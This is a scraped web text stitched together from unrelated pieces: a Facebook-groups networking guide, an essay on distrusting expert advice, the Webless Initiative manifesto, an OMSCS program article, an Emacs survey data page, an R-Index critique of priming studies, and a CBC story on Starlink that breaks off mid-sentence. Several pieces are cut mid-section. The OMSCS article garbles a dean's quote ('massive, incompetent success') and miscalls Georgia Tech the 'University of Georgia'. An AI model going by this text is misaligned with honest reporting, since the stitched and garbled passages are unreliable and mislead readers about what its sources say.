<div><p>The second reason why I like Facebook groups is that you can learn more about your ideal clients and the problems they face.</p><p>For example, here’s a query I searched on “SaaS Growth Hacks” (a group of SaaS business owners).</p><p>Let’s say you want to learn more about the process of hiring freelance writers or getting content outsourced.

<p>Other examples of queries could be:</p>



<ul><li>“<em>Looking for</em>” </li><li>“<em>Tools</em>” (to know what tools and software your target market use for exammple)</li></ul>



<h2><br>3. <strong>You can get fast results.</strong></h2>



<div><p>Finally, when you’re just starting, you need to have results.</p><p>Networking on Facebook groups doesn’t take a very long time and can yield quick results.</p><p>Let’s dive in!</p></div>







<p>Here are 5 tips to network successfully on Facebook groups:</p>



<ul><li>Know your ideal clients</li><li>Join targeted Facebook groups</li><li>Create a benefits-driven posts</li><li>Optimize your Facebook profile</li><li>Focus on building relationships</li></ul>



<h2>#1 Know your ideal clients</h2>



<div><p>The first step of networking successfully on Facebook groups it to know your ideal customers.</p><p>When I started my productized service I asked myself: <strong>Who are my ideal customers?</strong></p><p>I looked at my existing customer base and came up with several customer profiles:</p></div>



<ul><li>Solo entrepreneurs / software founders</li><li>Marketers and content creators</li><li>Agency owners</li></ul>



<div><p>For each of them, I tried to get in their heads and see how my service could help them achieve their goals.</p><p>For example, I found out that Agency owners wanted a flexible way to hire staff without adding too much fixed costs, and solo entrepreneurs wanted a cost effective way to get work done. </p><p>I interviewed them, listened to the words they were using, and started building buyer personas.</p><p>If you haven’t build buyer personas, interviewing your customers (or potential customers) is a great way to get started.</p></div>

<p>Once you’re in a Facebook group, make sure you check the rules and how it is moderated to play by the rules.</p>



<h2>#3 Create benefits-driven Facebook posts</h2>



<div><p>The key to win at networking on Facebook groups boils down to one thing: Value.</p><p>If you create valuable, benefits-driven posts, they will be accepted and the community will engage on these, with Facebook algorithm boosting their reach.</p><p>Here are some examples:</p><p><strong>1. Intro post</strong></p></div>



<div><p>Simply introduce yourself and what value you can bring to the community.</p><p>Here is a good example:</p></div>

<div><p>Some tips:</p><p>– Add proof (screenshots, numbers)<br>– Don’t forget to format the post to make it readble<br>– Add some background story</p></div>



<div><p><strong>4. Resource post</strong></p><p>Another way to network on Facebook groups is to create or share a resource for that audience:</p><p>Here’s an example:</p></div>



<figure><img src="https://manyrequests.com/wp-content/uploads/2020/12/resourcepost.png" alt="" width="311" height="315" srcset="https://manyrequests.com/wp-content/uploads/2020/12/resourcepost.png 932w, https://manyrequests.com/wp-content/uploads/2020/12/resourcepost-296x300.png 296w, https://manyrequests.com/wp-content/uploads/2020/12/resourcepost-768x780.png 768w, https://manyrequests.com/wp-content/uploads/2020/12/resourcepost-100x100.png 100w" sizes="(max-width: 311px) 100vw, 311px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20311%20315'%3E%3C/svg%3E" data-lazy-srcset="https://manyrequests.com/wp-content/uploads/2020/12/resourcepost.png 932w, https://manyrequests.com/wp-content/uploads/2020/12/resourcepost-296x300.png 296w, https://manyrequests.com/wp-content/uploads/2020/12/resourcepost-768x780.png 768w, https://manyrequests.com/wp-content/uploads/2020/12/resourcepost-100x100.png 100w" data-lazy-src="https://manyrequests.com/wp-content/uploads/2020/12/resourcepost.png"></figure>



<div><p>Some tips:</p><p>– Make an intro of why you created that resource<br>– Don’t share a blog post directly linking to your website. Instead, use Notion, Google Spreadsheets, a Google Docs, or Airtable. This will look less spammy</p><p><strong>5. Feedback / Launch post</strong></p></div>



<div><p>Another type of post is to ask for feedback and launch your service.</p><p>Here’s an example:</p></div>

<div><p>Some tips:</p><p>– Add a backstory <br>– Ask for feedback / review of your service<br>– You can also use it as an opportunity to ask for testers of your service in exchange for case studies if you’re launching</p></div>



<h2>#4 Optimize your profile for conversions</h2>



<div><p>Next step: Optimize your Facebook profile:</p><p>You can:</p></div>



<ul><li>Create a custom cover photo</li><li>Add a feature image</li><li>Add a tagline on your profile and profile picture</li></ul>



<div><p>If you have a Facebook group, a newsletter, or an ebook you can also add it in your profile. The key is to communicate what you do and get people to engage with you.</p><p>Here’s an example from Arrigo from <a href="https://www.koalarank.com/">Koala Rank</a>, a content writing service:</p></div>

<h2>#5 Focus on building relationships</h2>



<div><p>Like all networking, it’s about relationships and giving more than you take.</p><p>Don’t focus right away on selling your service. Instead, focus on building relationships.</p><p>Some tips:</p></div>



<ul><li>Send a connection request on LinkedIn after you’ve interacted with a prospect on a Facebook group</li><li>Don’t hesitate to make introductions to other members / partners that your connections might find valuable</li></ul>







<div><p>Facebook groups are a great way to find clients in different niches:</p><p>However, to do this successfully you must have a few pre-requisites:</p></div>



<ul><li>Know your value proposition and your target audience</li><li>Create and share valuable posts and resources</li><li>Focus on building relationships, not sales</li></ul>

<blockquote>
<p>“Most of all, there is this truth: No matter how great your teachers may be, and no matter how esteemed your academy’s reputation, eventually you will have to do the work by yourself. Eventually, the teachers won’t be there anymore. The walls of the school will fall away, and you’ll be on your own.” - <a href="https://amzn.to/2TtGVsm">Elizabeth Gilbert, Big Magic</a></p>
</blockquote>
<p>I am very intentional about cultivating peers and mentors who I trust. When I <a href="https://www.karllhughes.com/posts/cto-writer">left my job to start a business</a> earlier this year, one of the first things I did was create a list of informal advisors - mostly experienced entrepreneurs who I could count on for candid feedback.</p>
<p>Still, when I meet with one of my mentors to ask them a specific question, I start the conversation with a warning:</p>
<p>“I have a question, but just so you know, you’re not the only person I’m asking. If I don’t take your advice, I don’t want you to take it personally, okay?”</p>
<p>Every one of them appreciates this caveat because <strong>giving advice is really hard.</strong> In fact, I am starting to realize that you should be wary of people who are too quick to offer it.</p>
<p>The further I go in my career, the more skeptical I am of “experts.” While people with experience may generally make better decisions, I don’t know if their advice transfers the way they think it does.</p>
<p>Now, I realize the irony in offering advice to ignore advice, but my goal is to make you reconsider all advice - including the advice I give.</p>
<p>Above all, I hope this makes you think before you blindly follow others.</p>
<h2 id="1-experts-overgeneralize-their-experience">1. Experts Overgeneralize Their Experience</h2>
<p>Many legitimately successful people got lucky once.</p>
<p>You see this a lot in Silicon Valley-style businesses where a single expert or lucky investment might lead to generational wealth. These successful and wealthy people feel that they’ve discovered the “secret” to building a business based on a single runaway success.</p>
<p>This bias is called <a href="http://iameduard.com/overgeneralization/">overgeneralization</a>, and both advice givers and receivers fall into it.</p>
<p>For example, if you’ve read <a href="https://amzn.to/3oy8DSY">Walter Isaacson’s biography</a>, you know that Steve Jobs was a ruthless boss and obsessive about details. Jobs was amazingly successful as an entrepreneur and executive; therefore, you should be ruthless and obsessive if you want to be a successful entrepreneur and executive.</p>
<p>The logical fallacy here is obvious - we can point to dozens of counterpoints - but it illustrates the danger in overgeneralizing an expert’s advice or behavior.</p>
<p>Part of the reason we fall prey to experts who overgeneralize their experience is that as humans, <a href="https://manuel.friger.io/blog/advice">we really like stories</a>:</p>
<blockquote>
<p>“We love anecdotes so much because it’s often much easier for people to believe someone’s testimony as opposed to <strong>understanding complex data and variation across a continuum</strong>. Anecdotes exempt us from having to prove our point: it’s happened once; that’s solid proof as far as I’m concerned.” - <a href="https://manuel.friger.io/blog/advice">Manuel Frigerio</a></p>
</blockquote>
<p>Manuel cites Jeanne Calment, who lived to 116 years old and smoked every day of her adult life. Jeanne Calment is one data point. <strong>What worked for one person one time many years ago will not work for everyone for all time.</strong></p>
<p><img src="https://paper-attachments.dropbox.com/s_11C9E1C44BCB40F0FE12CD8C443C12B2DA5D48417F2028A6D847E5BE71580EB1_1603765436506_ovg.jpg" alt=""></p>
<p>Additionally, many experts <a href="https://twitter.com/KarlLHughes/status/1284104244891721730">rewrite their stories in their minds</a>.</p>
<p>Take Brian Williams, once an upstanding NBC news anchor and respected journalist. He told a complete fabrication of his experience in Iraq multiple times, including in an especially vivid recounting at a hockey game:</p>
<blockquote>
<p>“The story actually started with a terrible moment a dozen years back during the invasion of Iraq when the helicopter we were traveling in was forced down after being hit by an RPG.” - <a href="https://www.vox.com/2015/2/5/7987439/brian-williams-iraq-apology-helicopter">Brian Williams</a></p>
</blockquote>
<p>I don’t know if Williams knew he was lying or not, but if you want to believe his apology, he mistakenly inserted himself into a true story that he had seen:</p>
<blockquote>
<p>“I think the constant viewing of the video showing us inspecting the impact area — and the fog of memory over 12 years — made me conflate the two.” - Brian Williams (later apologizing)</p>
</blockquote>
<p>Whatever the details of Williams’ story, it’s easy to imagine that most professionals with 10+ years of experience will misremember or rewrite parts of their own experience when asked. This problem gets compounded when beginners ask for advice from experts because they can’t discern the misremembering from the truth.</p>
<p>Beginners don’t have enough experience to call bullsh** on experts.</p>
<h2 id="2-inherent-survivorship-bias">2. Inherent Survivorship Bias</h2>
<blockquote>
<p>“<strong>The Misconception:</strong> You should focus on the successful if you wish to become successful.</p>
<p><strong>The Truth:</strong> When failure becomes invisible, the difference between failure and success may also become invisible.” - <a href="https://youarenotsosmart.com/2013/05/23/survivorship-bias/">David McRaney</a></p>
</blockquote>
<p><strong>Survivors become experts</strong>, regardless of their skills, knowledge, or the repeatability of their experience.</p>
<p>Survivorship bias is one of the most dangerous ones in finance, and it’s one of the easiest traps to fall into when you look for advice. By taking only the positive cases (i.e.: people who succeeded in your field), you are unable to tell which factors were vital to their success and which factors were unrelated to it.</p>
<p>You hear the same thing from people who claim, “they sure don’t make ‘em like they used to.”</p>
<blockquote>
<p>“A commonly held opinion in many populations is that machinery, equipment, and goods manufactured in previous generations often is better built and lasts longer…because of the selective pressures of time and use, it is inevitable that only those items that were built to last will have survived into the present day.</p>
<p>Therefore, most of the old machinery still seen functioning well in the present day must necessarily have been built to a standard of quality necessary to survive. All of the machinery, equipment, and goods that have failed over the intervening years are no longer visible to the general population as they have been junked, scrapped, recycled, or otherwise disposed of.” - <a href="https://en.wikipedia.org/wiki/Survivorship_bias">Wikipedia, Survivorship Bias</a></p>
</blockquote>
<p><img src="https://paper-attachments.dropbox.com/s_11C9E1C44BCB40F0FE12CD8C443C12B2DA5D48417F2028A6D847E5BE71580EB1_1603765755896_survivor.jpg" alt=""></p>
<p>When survivors give advice, they conflate correlation and causation. Was the fact that <a href="https://tim.blog/about/">Tim Ferriss</a> executed his book launch a certain way the reason it succeeded? Or was the fact that Tim Ferriss had a massive audience of followers before his latest book launch the real reason?</p>
<p>We can’t know <a href="https://pjrvs.com/survivorship">because Tim Ferriss is a survivor</a>. He is one of the few authors who has “made it” to the level he has. By virtue of surviving this far, we have to take all of his marketing advice with a grain of salt.</p>
<p>The danger of survivorship bias is that it’s tough to combat. People <a href="https://www.inc.com/jeff-haden/want-to-really-help-others-talk-about-your-failures-not-successes.html">don’t like to talk about their failures</a>, and failures are subject to the same overgeneralization biases that successes are. In other words, <strong>even if someone tells you why they think they failed, they’re probably wrong.</strong></p>
<h2 id="3-the-expert-beginner-experience-gulf">3. The Expert-Beginner Experience Gulf</h2>
<p>Knowledge isn’t discrete - it’s a continuum.</p>
<p>Experts tend to forget that they have a considerable base of knowledge that beginners lack. This experience gap means that realizations the expert recently had will be useless (or even harmful) to beginners who lack the same foundational understanding.</p>
<p>For example, a friend of mine recently graduated from a coding bootcamp and asked me what podcasts I listen to.</p>
<p>I thought about it for a while. Are the software architecture and management podcasts I listen to going to help this guy? There weren’t many programming podcasts around when I learned to code, so I can’t tell him which ones helped me when I was just starting out. Should I selfishly send him the podcast that recently invited me on as a guest?</p>
<p>I struggle with advising new programmers because the gulf between my current level of experience and theirs is too broad. I don’t remember what I didn’t know when I was just starting out; plus, the world has changed. The books I read back then are hopelessly out of date, and the books I read now are hopelessly indecipherable to most new programmers.</p>
<p>This chart illustrates the problem. When you’re just starting to learn about a topic, you start in the bottom-left, and over time you move to the top right:</p>
<p><img src="https://i.imgur.com/zxD9C4I.png" alt="Knowledge contimuum"></p>
<p>Beginners need to grasp relationships and patterns, while experts are interested in uncovering principles. The advice experts give often comes from their higher-level understanding.</p>
<p>What’s more insidious about the expert-beginner gulf is that people’s brains actually <a href="https://www.wired.com/2009/03/financebrain/"><em>shut down</em> when given advice from an expert</a>:</p>
<blockquote>
<p>“When thinking for themselves, students showed activity in their anterior cingulate cortex and dorsolateral prefrontal cortex — brain regions associated with making decisions and calculating probabilities. When given advice from Noussair, activity in those regions flat lined. - <a href="https://www.wired.com/2009/03/financebrain/">Brandon Keim, Wired</a></p>
</blockquote>
<p>Even if the advice makes sense given the expert’s current level of understanding, the beginner may not grasp the underlying patterns required to make good use of the advice.</p>
<p>For example, we typically tell new drivers to stop at red lights. This is good generalized advice, but a beginner may not realize that there exceptions to this rule. What if the light is flashing red? What if it’s red, but no traffic is coming, and you want to turn right? What if you have a medical emergency?</p>
<p>Experienced drivers can make judgment calls based on advice and experience, but beginners cannot. They haven’t developed the filters to process and individualize advice.</p>
<h2 id="4-they-might-be-charlatans">4. They Might Be Charlatans</h2>
<p>It’s hard to believe I’ve gotten this far without mentioning experts who are blatantly slanting their advice towards profit, but I’ll get to it now.</p>
<p>First, what is a <em>charlatan?</em></p>
<blockquote>
<p>“A person who pretends or claims to have more knowledge or skill than he or she possesses; quack.” - <a href="https://www.dictionary.com/browse/charlatan">Dictionary.com</a></p>
</blockquote>
<p>Right now, most online courses are sold by charlatans. I’m not saying you can’t learn anything from them, but most people selling them don’t have much more knowledge than you do; they just offer their advice more confidently.</p>
<blockquote>
<p>“We now live in a time where information is becoming less and less commoditized and learning is becoming freer by passing days. So, it’s surprising that institutes and “experts” still exist and charge big money for courses.” - <a href="https://thatnameasif.medium.com/digital-marketing-courses-scam-be96464c12e2">Asif Ali</a></p>

<p>See the <a href="http://repo.hu/projects/webless/antiweb.html">Anti-web Manifesto</a>

</p><p><b>The Webless Initiative</b> is a campaign to make the modern Web a more
livable place. We aim to accomplish this by:
</p><ul>
	<li>Discouraging useless "style" or "interactive" features
	</li><li>Encouraging fast, portable, readable pages, with simpler HTML
</li></ul>
<p>This should:
</p><ul>
	<li>Make web browsers potentially a lot smaller, faster and comfortable<br>
	(realistically, make it possible to use existing small web browsers)
	</li><li>Drastically lessen the necessary bandwidth, making more room for real content
</li></ul>
<p>We plan to provide a set of rules and recommendations for anyone who wishes
to make their web page conformant. There will be an automatic validator for this
ruleset.
</p><p>We plan to create and maintain <b>two lists of websites</b>, with an appropriate
label or banner site owners can publish to indicate their membership:
</p><ul>
<li><b><a href="http://repo.hu/projects/webless/friends.html">Friends of Webless</a></b>
<p>
Simply by expressing their wish, anyone can be part of this list. The only
condition is that their site is <b>comfortably usable with a small web browser</b>.
</p><p>This might be manually checked, and Webless might refuse to keep the site listed,
if we perceive that it does not meet <a href="http://repo.hu/projects/webless/rules-friends.html">this rule</a>.

</p></li><li><b>Validated Webless</b>
<p>
Membership on this list is per request. The site will be checked
(and may be periodically rechecked) against the <a href="http://repo.hu/projects/webless/rules-validated.html">Webless Rules.</a>
Only sites passing these tests will be listed.
</p></li></ul>
<p>
We ask that listed (friends and validated) sites place a link on this page.
This is not mandatory; and the link might serve as a disclaimer for when
visitors are asking why your page is lacking all the modern whizbang.

                  <section>
              
<div><div>




<div><div>




<div><p>In January 2014, the Georgia Institute of Technology, Udacity, and AT&amp;T paired up to launch their first approved Master of Science in Computer Science from an accredited university where students can exclusively earn residential programs through a large online platform at a lower price.</p></div>
</div></div>



<p>The whole initiative formally referred to as “OMSCS” links education, MOOCs, and industry leaders to apply the transformative force of technology to broaden the pool of high-quality trained talent needed in the fields of computer science.</p>



<p><strong><em>The program was described by Zvi Galil, dean of computing at Georgia Tech, as a “The massive, incompetent success has already had a huge effect on the landscape of graduate education in computer science”</em></strong></p>



<p>While the university has not achieved its ambitious target of enrolling 10,000 students in three years, enrollment grew from 380 students in spring 2014 to 9,000 this spring, currently the largest master’s degree program in computer science in the United States.</p>



<p>During the annual U.S News &amp; World Report rankings, Georgia Tech graduate programs are consistently in the top 10 and are accredited by the Southern Association of Colleges and Schools Commission on Colleges (SACSCOC).</p>



<h3>A peek at Georgia Tech University’s Online Masters of Science in Computer Science (OMSCS) program:</h3>



<p>A 30 credit hours-10 course program is offered by the Online Masters of Science in Computer Science(OMSCS). Four specializations that can be completed within two-three years are offered in this curriculum. OMSCS’s growth was phenomenal, with OMSCS offering a total of 30 courses to 8,662 students in four specializations by the Spring 2019 term.</p>



<p>Georgia Tech has an exceptional admission policy, as the program does not require GRE. Instead in specific courses, students have to obtain a grade B or greater.</p>



<p>Tuition per credit for OMSCS is $180 per credit hour and the additional cost of $301 per semester of technology fees and institutional fees is added to the estimated cost. The cost of the program is around $5,400, where students can finish school from the OMSCS program with a total cost of less than $7000 for students who want to pursue OMSCS.</p>



<p>The application deadline to apply for OMSCS at Georgia Institute of Technology is 1st March 2021.&nbsp;</p>



<p><strong><em>“OMSCS has succeeded beyond our imagination. Our excellence centered on the professors, which largely accepted OMSCS and then passionately conducted the program,” Zvi Galil stated.</em></strong></p>



<p><strong><em>Galil also said that “OMSCS progress encouraged Georgia Tech to introduce two additional degrees (on edX). With 250 students, the OMS Analytics degree started in fall 2017; the enrollment this semester is 1,500. With about 250 students, the OMS Cybersecurity degree was implemented in January”.</em></strong></p>



<h3>How much is the tuition for University of Georgia Online Masters in computer science in 2020?</h3>



<p><strong><span>Students can still get a complete a master’s degree at Georgia Tech University for the Online Masters of Science in Computer Science for the academic year 2020-2021 at a total tuition cost of around $7000.</span></strong></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <h2>Questions</h2>
      <p>For reference, this was <a href="https://emacssurvey.org/2020/emacs-user-survey-2020.org">the survey questions</a> in org-mode format.</p>
      <h2>Data</h2>
      <ul>
        <li>
          <a href="https://emacssurvey.org/2020/Emacs-User-Survey-2020-raw.csv">Raw data</a>
          <ul>
            <li>the reconciled data from both webform and email submissions</li>
            <li>absolutely no change made aside from a few instances where PII and email addresses were redacted</li>
          </ul>
        </li>
        <li>
          <a href="https://emacssurvey.org/2020/Emacs-User-Survey-2020-clean.csv">Cleaned up data</a><br>
          It might get updated in the future, but right now it was derived from the raw data in a best-effort attempt:
          <ul>
            <li>removed negative years in "For how many years have you been using Emacs?"</li>
            <li>unified responses for "How did you hear about this survey?" as Hacker News, Emacs China and Emacs News weren't part of the options</li>
            <li>unified responses for "Which theme do you use?", especially around spelling</li>
            <li>general cleanup and unified of responses which only differed by punctuation and casing</li>
          </ul>
        </li>
      </ul>
      <h2>Statistics about the survey</h2>
      
      <h2>Analysis</h2>
      <p>There is a lot of data to look at in many different ways. For now, I performed a simple question-by-question analysis using a <a href="https://github.com/abrochard/emacs-survey/blob/main/2020/Emacs%20User%20Survey%202020.ipynb">Jupyter Notebook</a>.</p>
      <p>Also, since free text was available for most questions, it can be hard to categorize some of the results. For multiple choice questions, I did a best effort attempt to bundle responses with low cardinality into an "other" section, which can get quite big in some cases! I also did not attempt to graph anything for pure free text questions. I encourage anyone who is curious to inspect the full responses, either in the notebook or looking at the data directly. The omitted free text questions are:
        </p><ul>
          <li>If you use org-mode, for what purpose?</li>
          <li>Do you use a language server with lsp-mode or eglot? With what languages?</li>
          <li>Do you use an Emacs debugger interface? What do you use? (Gdb, dap-mode etc)</li>
          <li>What are some of the Emacs improvements you are the most interested in?</li>
          <li>What do you think are Emacs' greatest strengths?</li>
          <li>Can you recall any difficulties you faced initially learning Emacs?</li>
          <li>What is the one thing you would like Emacs to do differently?</li>
          <li>If there is another survey in 2021, would you be opposed to it containing optional &amp; general demographics questions?</li>
          <li>Do you have a preferred platform for filling out the survey in the future?</li>
          <li>Do you have general feedback about the survey process?</li>
        </ul>

		<p><strong>Authors:&nbsp; Ulrich Schimmack, Moritz Heene, and Kamini Kesavan</strong></p>

<p><strong>Abstract:</strong><br>
We computed the R-Index for studies cited in Chapter 4 of Kahneman’s book “Thinking Fast and Slow.” This chapter focuses on priming studies, starting with John Bargh’s study that led to Kahneman’s open email.&nbsp; The results are eye-opening and jaw-dropping.&nbsp; The chapter cites 12 articles and 11 of the 12 articles have an R-Index below 50.&nbsp; The combined analysis of 31 studies reported in the 12 articles shows 100% significant results with average (median) observed power of 57% and an inflation rate of 43%.&nbsp; The R-Index is 14. This result confirms Kahneman’s prediction that priming research is a train wreck and readers of his book “Thinking Fast and Slow” should not consider the presented studies as scientific evidence that subtle cues in their environment can have strong effects on their behavior outside their awareness.</p>
<p><strong>Introduction</strong></p>
<p>In 2011, Nobel Laureate Daniel Kahneman published a popular book, <a href="https://en.wikipedia.org/wiki/Thinking,_Fast_and_Slow" target="_blank" rel="noopener">“Thinking Fast and Slow”</a>, about important finding in social psychology.</p>
<p>In the same year, questions about the trustworthiness of social psychology were raised.&nbsp; A Dutch social psychologist had fabricated data. Eventually over 50 of his articles would be retracted.&nbsp; Another social psychologist published results that appeared to demonstrate the ability to foresee random future events (Bem, 2011). Few researchers believed these results and statistical analysis suggested that the results were not trustworthy (Francis, 2012; Schimmack, 2012).&nbsp; Psychologists started to openly question the credibility of published results.</p>
<p>In the beginning of 2012, <a href="http://journals.plos.org/plosone/article?id=10.1371/journal.pone.0029081">Doyen and colleagues</a> published a failure to replicate a prominent study by John Bargh that was featured in Daniel Kahneman’s book.&nbsp; A few month later, Daniel Kahneman distanced himself from Bargh’s research in an <a href="http://www.decisionsciencenews.com/2012/10/05/kahneman-on-the-storm-of-doubts-surrounding-social-priming-research/">open email</a> addressed to John Bargh (<a href="http://www.nature.com/news/nobel-laureate-challenges-psychologists-to-clean-up-their-act-1.11535">Young, 2012</a>):</p>
<p>“As all of you know, of course, questions have been raised about the robustness of priming results…. your field is now the poster child for doubts about the integrity of psychological research… people have now attached a question mark to the field, and it is your responsibility to remove it… all I have personally at stake is that I recently wrote a book that emphasizes priming research as a new approach to the study of associative memory…Count me as a general believer… My reason for writing this letter is that I see a train wreck looming.”</p>
<p>Five years later, Kahneman’s concerns have been largely confirmed. Major studies in social priming research have failed to replicate and the replicability of results in social psychology is estimated to be only 25% (<a href="http://www.nature.com/news/over-half-of-psychology-studies-fail-reproducibility-test-1.18248">OSC, 2015</a>).</p>
<p>Looking back, it is difficult to understand the uncritical acceptance of social priming as a fact.&nbsp; In “Thinking Fast and Slow” Kahneman wrote “disbelief is not an option. The results are not made up, nor are they statistical flukes. You have no choice but to accept that the major conclusions of these studies are true.”</p>
<p>Yet, Kahneman could have seen the train wreck coming. In 1971, he co-authored an article about scientists’ “exaggerated confidence in the validity of conclusions based on small samples” (Tversky &amp; Kahneman, 1971, p. 105).&nbsp; Yet, many of the studies described in Kahneman’s book had small samples.&nbsp; For example, Bargh’s priming study used only 30 undergraduate students to demonstrate the effect.</p>
<p><strong>Replicability Index</strong></p>
<p>Small samples can be sufficient to detect large effects. However, small effects require large samples.&nbsp; The probability of replicating a published finding is a function of sample size and effect size.&nbsp; The Replicability Index (<a href="https://replicationindex.wordpress.com/2016/01/31/a-revised-introduction-to-the-r-index/">R-Index</a>) makes it possible to use information from published results to predict how replicable published results are.</p>
<p>Every reported test-statistic can be converted into an estimate of power, called observed power. For a single study, this estimate is useless because it is not very precise. However, for sets of studies, the estimate becomes more precise. &nbsp;If we have 10 studies and the average power is 55%, we would expect approximately 5 to 6 studies with significant results and 4 to 5 studies with non-significant results.</p>
<p>If we observe 100% significant results with an average power of 55%, it is likely that studies with non-significant results are missing (Schimmack, 2012).&nbsp; There are too many significant results.&nbsp; This is especially true because average power is also inflated when researchers report only significant results. Consequently, the true power is even lower than average observed power.&nbsp; If we observe 100% significant results with 55% average powered power, power is likely to be less than 50%.</p>
<p>This is unacceptable. Tversky and Kahneman (1971) wrote “we refuse to believe that a serious investigator will knowingly accept a .50 risk of failing to confirm a valid research hypothesis.”</p>
<p>To correct for the inflation in power, the R-Index uses the inflation rate. For example, if all studies are significant and average power is 75%, the inflation rate is 25% points. &nbsp;The R-Index subtracts the inflation rate from average power.&nbsp; So, with 100% significant results and average observed power of 75%, the R-Index is 50% (75% – 25% = 50%).&nbsp; The R-Index is not a direct estimate of true power. It is actually a conservative estimate of true power if the R-Index is below 50%.&nbsp; Thus, an R-Index below 50% suggests that a significant result was obtained only by capitalizing on chance, although it is difficult to quantify by how much.</p>
<p><strong>How Replicable are the Social Priming Studies in “Thinking Fast and Slow”?</strong></p>
<p><strong>Chapter 4: The Associative Machine</strong></p>
<p><strong>4.1.&nbsp; Cognitive priming effect</strong></p>
<p>In the 1980s, psychologists discovered that exposure to a word causes immediate and measurable changes in the ease with which many related words can be evoked.</p>
<p>[no reference provided]</p>
<p><strong>4.2.&nbsp; Priming of behavior without awareness </strong></p>
<p>Another major advance in our understanding of memory was the discovery that priming is not restricted to concepts and words. You cannot know this from conscious experience, of course, but you must accept the alien idea that your actions and your emotions can be primed by events of which you are not even aware.</p>
<p>“In an experiment that became an instant classic, the psychologist John Bargh and his collaborators asked students at New York University—most aged eighteen to twenty-two—to assemble four-word sentences from a set of five words (for example, “finds he it yellow instantly”). For one group of students, half the scrambled sentences contained words associated with the elderly, such as Florida, forgetful, bald, gray, or wrinkle. When they had completed that task, the young participants were sent out to do another experiment in an office down the hall. That short walk was what the experiment was about. The researchers unobtrusively measured the time it took people to get from one end of the corridor to the other.”</p>
<p>“As Bargh had predicted, the young people who had fashioned a sentence from words with an elderly theme walked down the hallway significantly more slowly than the others. walking slowly, which is associated with old age.”</p>
<p>“All this happens without any awareness. When they were questioned afterward, none of the students reported noticing that the words had had a common theme, and they all insisted that nothing they did after the first experiment could have been influenced by the words they had encountered. The idea of old age had not come to their conscious awareness, but their actions had changed nevertheless.“</p>

<p><strong>4.3. &nbsp;Reversed priming: Behavior primes cognitions</strong></p>
<p>“The ideomotor link also works in reverse. A study conducted in a German university was the mirror image of the early experiment that Bargh and his colleagues had carried out in New York.”</p>
<p>“Students were asked to walk around a room for 5 minutes at a rate of 30 steps per minute, which was about one-third their normal pace. After this brief experience, the participants were much quicker to recognize words related to old age, such as forgetful, old, and lonely.”</p>
<p>“Reciprocal priming effects tend to produce a coherent reaction: if you were primed to think of old age, you would tend to act old, and acting old would reinforce the thought of old age.”</p>

<p><strong>4.4.&nbsp; Facial-feedback hypothesis (smiling makes you happy)</strong></p>
<p>“Reciprocal links are common in the associative network. For example, being amused tends to make you smile, and smiling tends to make you feel amused….”</p>
<p>“College students were asked to rate the humor of cartoons from Gary Larson’s The Far Side while holding a pencil in their mouth. Those who were “smiling” (without any awareness of doing so) found the cartoons funnier than did those who were “frowning.”</p>
<p>[“Inhibiting and Facilitating Conditions of the Human Smile: A Nonobtrusive Test of the Facial Feedback Hypothesis,” <em>Journal of Personality and Social Psychology </em>54 (1988): 768–77.]</p>
<p>The authors used the more liberal and unconventional criterion of p &lt; .05 (one-tailed), z = 1.65, as a criterion for significance. Accordingly, we adjusted the R-Index analysis and used 1.65 as the criterion value.</p>

It's expensive. And stargazers fear it will ruin the night sky.</p>  <p>But for users in rural and remote areas who've long struggled to obtain internet access on equal footing with Canadians in urban areas, Starlink is offering hope. The service was recently made available to select users for "beta testing," with the promise of wider availability in 2021.&nbsp;</p>  <p>In Pikangikum, a fly-in community of 2,800 residents in northwest Ontario, Kejick said he'd become accustomed to download speeds of only 2 megabits per second —&nbsp;a fraction of the 50 megabits per the second the federal government considers a standard minimum for broadband.</p>    <p>At work, Kejick couldn't open large email attachments. He described the service as "deplorable."</p>  <p>At the end of November, Pikangikum became the first Indigenous community to get connected to Starlink, with 60 dishes reserved for homes and businesses in the community in the initial phase of installation, and potentially another 40 by the end of December.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5831800.1607376960!/fileImage/httpImage/image.JPG_gen/derivatives/original_300/tesla-musk-germany.JPG 300w,https://i.cbc.ca/1.5831800.1607376960!/fileImage/httpImage/image.JPG_gen/derivatives/original_460/tesla-musk-germany.JPG 460w,https://i.cbc.ca/1.5831800.1607376960!/fileImage/httpImage/image.JPG_gen/derivatives/original_620/tesla-musk-germany.JPG 620w,https://i.cbc.ca/1.5831800.1607376960!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/tesla-musk-germany.JPG 780w,https://i.cbc.ca/1.5831800.1607376960!/fileImage/httpImage/image.JPG_gen/derivatives/original_1180/tesla-musk-germany.JPG 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5831800.1607376960!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/tesla-musk-germany.JPG"></p></div><figcaption>Elon Musk's SpaceX firm has promised Starlink internet will provide 'near global coverage of the populated world' in 2021.<!-- --> <!-- -->(Hannibal Hanschke/Pool via REUTERS)</figcaption></figure></span></p>  <p>Now, Kejick said his devices have been reaching 144 megabits per second. Not only can he quickly download attachments, Kejick said his wife has finally been able to chat with relatives in the Philippines over FaceTime.&nbsp;</p>  <p>"It's as if you're sitting in the same room," he said.</p>  <p>In Pikangikum, however, Starlink could offer more fundamental changes. Kejick, a victim services advocate with the Ontario Ministry of the Attorney General, said he hopes victims of crime will&nbsp;now be able to testify virtually, lessening the burden on them.</p>  <p>Members of the remote Ojibwe community hope the faster internet will remove barriers to access virtual healthcare services and education, too.</p>    <p>"It's doing everything that people are asking it to do," said David Brown, CEO of FSET Information Technology in Kenora, Ont. His firm had been working with Pikangikum for several years to try to improve their connectivity.&nbsp;</p>  <p>When he heard about Starlink, Brown jokingly promised his staff he would directly contact SpaceX's Musk —&nbsp;who recently surpassed Microsoft founder Bill Gates as one of the world's richest people, second only to Amazon CEO Jeff Bezos.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5768390.1603139721!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/spacex-starlink.jpg 300w,https://i.cbc.ca/1.5768390.1603139721!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/spacex-starlink.jpg 